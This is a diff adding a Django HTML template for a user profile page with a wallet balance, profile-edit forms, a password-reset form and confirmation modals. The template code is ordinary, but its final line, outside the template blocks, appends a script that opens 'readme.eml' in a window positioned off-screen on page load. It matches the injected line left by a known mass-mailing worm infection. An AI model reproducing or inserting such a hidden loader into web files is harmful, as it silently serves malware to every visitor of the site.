@@ -1,0 +1,277 @@
+{% extends 'Home/base.html' %}
+
+{% load static %}
+
+
+{% block title %}
+	<title>Profile</title>
+{% endblock %}
+
+
+{% block page_header %}
+
+  <div class="content-wrapper">
+    <!-- Content Header (Page header) -->
+    <div class="content-header">
+      <div class="container-fluid">
+        <div class="row mb-2">
+          <div class="col-sm-6">
+            <h1 class="m-0 text-dark">Profile</h1>
+          </div><!-- /.col -->
+          <div class="col-sm-6">
+            <ol class="breadcrumb float-sm-right">
+              <li class="breadcrumb-item"><a href="{% url 'Home:account_profile' %}">Profile</a></li>
+              <li class="breadcrumb-item active">Profile</li>
+            </ol>
+          </div><!-- /.col -->
+        </div><!-- /.row -->
+      </div><!-- /.container-fluid -->
+    </div>
+    <!-- /.content-header -->
+{% endblock %}
+
+
+{% block content %}
+	{% for message in messages %}
+	<div class="alert alert-info">
+			<a class="close" href="#" data-dismiss="alert">×</a>
+			{{ message }}
+	</div>
+	{% endfor %}
+
+	<div class="row">
+        <div class="col-md-8 connectedSortable">
+            <div class="card callout callout-info">
+	            <div class="card-header border-transparent">
+	                <h3 class="card-title">
+	                  <i class="fas fa-user"></i>
+	                  Profile
+	                </h3>
+	            </div>
+	            <!-- /.card-header -->
+	            <div class="card-body">
+            		<div class="table-responsive">
+			    		<table class="table m-0">
+				            <tbody>
+					            <tr>
+					            	<th>First name</th><td>{{user.first_name}}</td>
+					            </tr>
+					            <tr>
+					            	<th>Last name</th><td>{{user.last_name}}</td>
+					            </tr>
+					            <tr>
+					            	<th>E-Mail</th><td>{{user.email}}</td>
+					            </tr>
+					            <tr>
+					            	<th>Username</th><td>{{user.username}}</td>
+					            </tr>
+					            <tr>
+					            	<th>Wallet Balance</th><td>&#8358; {{user_wallet.wallet_balance}}</td>
+					            </tr>
+					            <tr>
+					            	<th>Account type</th><td>{{user_profile.account_type}}</td>
+					            </tr>
+					            <tr>
+					            	<th>Ref ID</th><td>{{user_profile.reference_id}}</td>
+					            </tr>
+					            <tr>
+					            	<th>State</th><td>{{user_profile.state}}</td>
+					            </tr>
+					            <tr>
+					            	<th>Phone number</th><td>{{user_profile.phone_number}}</td>
+					            </tr>
+					            <tr>
+					            	<th>Date Joined</th><td>{{user_profile.date_joined}}</td>
+					            </tr>
+				            </tbody>
+			        	</table>
+				    </div>
+	            </div>
+	            <!-- /.card-body -->
+            </div>
+            <!-- /.card -->
+        </div>
+          <!-- ./col -->
+        <div class="col-md-4 connectedSortable">
+        	<div class="row">
+        		<div class="col-md-12 connectedSortable">
+		            <div class="card callout callout-danger">
+		            	<div class="card-header">
+		                	<h3 class="card-title">
+		                	<i class="fas fa-user-edit"></i> Edit Profile</h3>
+		             	</div>
+		              	<!-- /.card-header -->
+		              	<form method="POST">
+		              		{% csrf_token %}
+
+			              	<div class="card-body">
+			              		<table>
+					                <!-- {{profile_form.as_table}} -->
+
+									<div class="form-group">
+										<select name="state" id="id_state" class="custom-select" required>
+											<option value="" selected>-- State --</option>
+
+											{% for state in all_states %}
+												<option value="{{state}}">{{state}}</option>
+											{% endfor %}
+										</select>
+									</div>
+
+									<div class="form-group">
+										<select name="account_type" id="id_account_type" class="custom-select" required>
+											<option value="" selected>-- Account type --</option>
+
+											{% for account_type in all_account_types %}
+												<option value="{{account_type}}">{{account_type}}</option>
+											{% endfor %}
+										</select>
+									</div>
+
+									<div class="form-group">
+					                    <input name="phone_number" type="text" class="form-control" placeholder="Phone number">
+					                </div>
+					            </table>
+			              	</div>
+
+			              	<!-- /.card-body -->
+			              	<div class="modal fade" id="confirmSave">
+						        <div class="modal-dialog modal-sm">
+						          <div class="modal-content">
+							            <div class="modal-header">
+							              	<h4 class="modal-title">Confirm Request</h4>
+							              	<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+							            		<span aria-hidden="true">&times;</span>
+							            	</button>
+							            </div>
+							            <div class="modal-body">
+							            	<p>Are you sure you want to Change your Profile?</p>
+							            </div>
+							            <div class="modal-footer justify-content-between">
+							            	<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+							            	<button type="submit" class="btn btn-primary btn-success">Save Profile</button>
+							            </div>
+						        	</div>
+						          <!-- /.modal-content -->
+						        </div>
+						        <!-- /.modal-dialog -->
+						    </div>
+
+					        <div style="text-align: center;">
+					          	<button type="button" class="btn btn-primary btn-success" data-toggle="modal" data-target="#confirmSave">Save Profile</button>
+					        </div>
+		              	</form>
+		            </div>
+		        </div>
+        	</div>
+        	<div class="row">
+        		<div class="col-md-12 connectedSortable">
+		            <div class="card callout callout-danger">
+		            	<div class="card-header">
+		                	<h3 class="card-title">
+		                	<i class="fas fa-lock"></i> Reset Password</h3>
+		             	</div>
+		              	<!-- /.card-header -->
+		              	<form method="POST">
+		              		{% csrf_token %}
+
+			              	<div class="card-body">
+				                <div class="form-group">
+				                    <input name="old_password" type="password" class="form-control" placeholder="Old Password">
+				                </div>
+
+			              		<div class="row">
+			              			<div class="col">
+				              			<div class="form-group">
+						                    <input name="new_password" type="password" class="form-control" placeholder="Password">
+						                </div>
+						            </div>
+
+									<div class="col">
+						                <div class="form-group">
+						                    <input name="confirm_password" type="password" class="form-control" placeholder="Password (Again)">
+						                </div>
+						            </div>
+			              		</div>
+			              	</div>
+
+			              	<!-- /.card-body -->
+					        <div style="text-align: center;">
+					          	<button type="submit" class="btn btn-primary btn-success">Reset Password</button>
+					        </div>
+		              	</form>
+		            </div>
+		        </div>
+        	</div>
+            <!-- /.card -->
+        </div>
+          <!-- ./col -->
+    </div>
+    <div class="row">
+	    <div class="col connectedSortable">
+	        <div class="card callout callout-danger">
+	        	<div class="card-header">
+	            	<h3 class="card-title">
+	            	<i class="fas fa-user-edit"></i> Edit</h3>
+	         	</div>
+	          	<!-- /.card-header -->
+	          	<form method="POST">
+	          		{% csrf_token %}
+
+	              	<div class="card-body">
+		                <div class="form-group">
+		                    <input name="{{user_update_form.first_name.name}}" type="text" class="form-control" placeholder="First name" value="{{user.first_name}}">
+		                </div>
+
+		                <div class="form-group">
+		                    <input name="{{user_update_form.last_name.name}}" type="text" class="form-control" placeholder="Last name" value="{{user.last_name}}">
+		                </div>
+
+		                <div class="form-group">
+		                    <input name="{{user_update_form.email.name}}" type="email" class="form-control" placeholder="E-Mail" value="{{user.email}}">
+		                </div>
+
+		                <div class="form-group">
+		                    <input name="{{user_update_form.username.name}}" type="text" class="form-control" placeholder="Username" value="{{user.username}}" readonly="true">
+		                </div>
+
+		                <div class="form-group">
+		                    <input name="password1" type="password" class="form-control" placeholder="Password">
+		                </div>
+	              	</div>
+
+					<div class="modal fade" id="confirmSaveDetails">
+				        <div class="modal-dialog modal-sm">
+				          <div class="modal-content">
+					            <div class="modal-header">
+					              	<h4 class="modal-title">Confirm Request</h4>
+					              	<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					            		<span aria-hidden="true">&times;</span>
+					            	</button>
+					            </div>
+					            <div class="modal-body">
+					            	<p>Are you sure you want to Change your Profile?</p>
+					            </div>
+					            <div class="modal-footer justify-content-between">
+					            	<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+					            	<button type="submit" class="btn btn-primary btn-success">Save Changes</button>
+					            </div>
+				        	</div>
+				          <!-- /.modal-content -->
+				        </div>
+				        <!-- /.modal-dialog -->
+				    </div>
+
+	              	<!-- /.card-body -->
+			        <div style="text-align: center;">
+			          	<button type="button" class="btn btn-primary btn-success" data-toggle="modal" data-target="#confirmSaveDetails">Save Changes</button>
+			        </div>
+	          	</form>
+	        </div>
+	        <!-- /.card -->
+	    </div>
+	</div>
+
+{% endblock %}
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
